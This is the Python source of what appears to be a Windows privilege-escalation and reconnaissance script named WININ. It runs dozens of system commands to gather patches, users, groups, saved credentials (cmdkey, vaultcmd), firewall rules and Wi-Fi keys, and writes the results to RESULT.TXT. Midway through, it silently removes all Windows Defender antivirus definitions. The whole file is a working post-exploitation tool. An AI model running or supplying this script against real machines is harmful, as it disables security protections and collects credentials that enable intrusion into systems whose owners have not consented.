def clear_page():
	from os import system, name
	if name == "nt":
		_ = system("cls")
	else:
		_ = system("clear")
def banner():
	from colorama import Fore
	print(Fore.GREEN + """		
				░██╗░░░░░░░██╗██╗███╗░░██╗██╗███╗░░██╗
				░██║░░██╗░░██║██║████╗░██║██║████╗░██║
				░╚██╗████╗██╔╝██║██╔██╗██║██║██╔██╗██║
				░░████╔═████║░██║██║╚████║██║██║╚████║
				░░╚██╔╝░╚██╔╝░██║██║░╚███║██║██║░╚███║
				░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝╚═╝░░╚══╝

				Github : https://github.com/YA3IN3A44RI/WININ
		""")
def auto_windows_info():
	from colorama import Fore
	import subprocess
	print(Fore.GREEN + "[+] " + Fore.WHITE + "Starting...")
	PROCESSOR_ARCHITECTURE = subprocess.getoutput(f"wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%")
	PROCESSOR_ARCHITECTURE = PROCESSOR_ARCHITECTURE.replace(" ", "")
	PROCESSOR_ARCHITECTURE = " ".join(PROCESSOR_ARCHITECTURE.split())
	SYSTEM_INFO = subprocess.getoutput(f"systeminfo")
	PATCHES = subprocess.getoutput(f"wmic qfe get Caption,Description,HotFixID,InstalledOn")
	DRIVER = subprocess.getoutput(f"DRIVERQUERY")
	ENV_VARS = subprocess.getoutput(f"set")
	DNS_DC = subprocess.getoutput(f"nslookup %LOGONSERVER%.%USERDNSDOMAIN%")
	print(Fore.GREEN + "[+] " + Fore.WHITE + "Proccess : 10 %")
	DISKS = subprocess.getoutput(f"wmic logicaldisk get caption,description,providername")
	AV_INFO = subprocess.getoutput(f"sc query windefend")
	DELETE_RULES = subprocess.getoutput(f"'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All")
	print(Fore.GREEN + "[+] " + Fore.WHITE + "Proccess : 20 %")
	RES_BIN = subprocess.getoutput(f"dir C:\$Recycle.Bin /s /b")
	INSTALLED_SOFTWARES = subprocess.getoutput(f"reg query HKEY_LOCAL_MACHINE\SOFTWARE")
	LIST_SERVICES = subprocess.getoutput(f"wmic service list brief")
	STARTED_SERICES = subprocess.getoutput(f"net start")
	print(Fore.GREEN + "[+] " + Fore.WHITE + "Proccess : 30 %")
	LINK_PROCESS_STARTED_SERVICE = subprocess.getoutput(f"tasklist /SVC")
	DOMAIN_NAME = subprocess.getoutput(f"echo %USERDOMAIN%")
	DOMAIN_CONTROLLER = subprocess.getoutput(f"echo %logonserver%")
	CURENT_POLICY_APPLIED = subprocess.getoutput(f"gpresult /V")
	print(Fore.GREEN + "[+] " + Fore.WHITE + "Proccess : 40 %")
	WHOAMI_INFO = subprocess.getoutput(f"whoami /all")
	ALL_USERS = subprocess.getoutput(f"net users")
	PASS_REQ = subprocess.getoutput(f"net accounts")
	ANY_LOGGED = subprocess.getoutput(f"klist sessions")
	SESSION_LIST = subprocess.getoutput(f"qwinsta")
	ALL_GROUPS = subprocess.getoutput(f"net localgroup")
	print(Fore.GREEN + "[+] " + Fore.WHITE + "Proccess : 50 %")
	ADMIN_GROUP = subprocess.getoutput(f"net localgroup Administrators")
	CREDENS = subprocess.getoutput(f"cmdkey /list")
	VAULTS = subprocess.getoutput(f"vaultcmd /listcreds:'Windows Credentials' /all")
	print(Fore.GREEN + "[+] " + Fore.WHITE + "Proccess : 60 %")
	IPCONFS = subprocess.getoutput(f"ipconfig /all")
	ROUTERS = subprocess.getoutput(f"route print")
	KNOW_HOSTS = subprocess.getoutput(f"arp -a")
	OPEN_PORTS = subprocess.getoutput(f"netstat -ano")
	print(Fore.GREEN + "[+] " + Fore.WHITE + "Proccess : 70 %")
	RECORDS = subprocess.getoutput(f'ipconfig /displaydns | findstr "Record" | findstr "Name Host"')
	HOSTS_ETC = subprocess.getoutput(f"type C:\WINDOWS\System32\drivers\etc\hosts")
	FW_STATUS = subprocess.getoutput(f"netsh firewall show state")
	print(Fore.GREEN + "[+] " + Fore.WHITE + "Proccess : 80 %")
	FW_RULES = subprocess.getoutput(f"netsh advfirewall firewall show rule name=all")
	FW_INFO = subprocess.getoutput(f"netsh firewall show config")
	FW_PROFILES = subprocess.getoutput(f"netsh Advfirewall show allprofiles")
	SHARE_FOLDER = subprocess.getoutput(f"net share")
	print(Fore.GREEN + "[+] " + Fore.WHITE + "Proccess : 90 %")
	AP_SSIDS = subprocess.getoutput(f"netsh wlan show profile")
	GET_PASS = subprocess.getoutput(f"netsh wlan show profile <SSID> key=clear")
	SNMPS = subprocess.getoutput(f"reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s")
	URLACL = subprocess.getoutput(f"netsh http show urlacl")
	print(Fore.GREEN + "[+] " + Fore.WHITE + "Proccess : 100 %")
	print(Fore.GREEN + "[+] " + Fore.WHITE + "Saving All Informations")
	try:
		SAVE_ALL_RESULT = open("RESULT.TXT", "a")
		SAVE_ALL_RESULT.write(PROCESSOR_ARCHITECTURE + "\n" + SYSTEM_INFO + "\n" + PATCHES + "\n" + DRIVER + "\n" + ENV_VARS + "\n" + DNS_DC + "\n" + DISKS + "\n" + AV_INFO + "\n" + DELETE_RULES + "\n" + RES_BIN + "\n" + INSTALLED_SOFTWARES + "\n" + LIST_SERVICES + "\n" + STARTED_SERICES + "\n" + LINK_PROCESS_STARTED_SERVICE + "\n" + DOMAIN_NAME + "\n" + DOMAIN_CONTROLLER + "\n" + CURENT_POLICY_APPLIED + "\n" + WHOAMI_INFO + "\n" + ALL_USERS + "\n" + PASS_REQ + "\n" + ANY_LOGGED + "\n" + SESSION_LIST + "\n" + ALL_GROUPS + "\n" + ADMIN_GROUP + "\n" + CREDENS + "\n" + VAULTS + "\n" + IPCONFS + "\n" + ROUTERS + "\n" + KNOW_HOSTS + "\n" + OPEN_PORTS + "\n" + RECORDS + "\n" + HOSTS_ETC + "\n" + FW_STATUS +"\n" + FW_RULES + "\n" + FW_INFO + "\n" + FW_PROFILES + "\n" + SHARE_FOLDER +"\n" + AP_SSIDS + "\n" + GET_PASS + "\n" + SNMPS + "\n" + URLACL)
		print(Fore.GREEN + "[+] " + Fore.WHITE + "All Data Saved To RESULT.TXT")
	except:
		print(Fore.RED + "[-] " + Fore.WHITE + "Error, Proccess Can't Be Finished!!")
	input(Fore.GREEN + "[+] " + Fore.WHITE + "Press Any Key To Exit")
clear_page()
banner()
auto_windows_info()